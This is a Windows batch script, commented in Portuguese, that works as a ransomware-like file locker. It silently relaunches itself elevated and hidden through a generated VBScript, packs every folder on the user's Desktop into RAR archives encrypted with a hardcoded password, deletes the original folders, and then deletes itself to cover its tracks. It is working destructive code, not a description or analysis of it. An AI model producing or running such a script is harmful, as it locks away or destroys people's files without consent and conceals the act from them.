@echo off
chcp 65001 > nul

:: Verifica se já está em modo oculto
if not "%1"=="hidden" (
    :: Usa VBScript para executar totalmente oculto
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\hidden.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~f0"" hidden", "", "runas", 0 >> "%temp%\hidden.vbs"
    cscript //nologo "%temp%\hidden.vbs"
    del "%temp%\hidden.vbs" >nul 2>&1
    exit
)

:: Configurações
set "senha=DefaultPassword123"
set "winrar_path="

:: Localiza o WinRAR
for %%i in (
  "%ProgramFiles%\WinRAR\WinRAR.exe"
  "%ProgramFiles(x86)%\WinRAR\WinRAR.exe"
  "%ProgramW6432%\WinRAR\WinRAR.exe"
) do if exist "%%~i" set "winrar_path=%%~i"

if not defined winrar_path exit /b 1

:: Processo de compactação com exclusão automática
cd /d "%USERPROFILE%\Desktop"
set "contador=0"

for /d %%d in (*) do (
  echo Compactando e removendo original: %%~nxd
  "%winrar_path%" a -r -ep1 -hp"%senha%" -m3 -md64m -mmt=on -idq -ol -ibck -df "%%~nxd.rar" "%%~d" >nul 2>&1
  
  if exist "%%~nxd.rar" (
    set /a "contador+=1"
    if exist "%%~d" (
      rd /s /q "%%~d" >nul 2>&1
    )
  )
)

:: **Autoexclusão do script .bat**
(
  echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
  echo fso.DeleteFile^(WScript.Arguments^(0^)^)
  echo Set WshShell = CreateObject^("WScript.Shell"^)
  echo WshShell.Run "cmd /c del /f /q ""%~f0""", 0, True
) > "%temp%\self_delete.vbs"

cscript //nologo "%temp%\self_delete.vbs" "%~f0" & exit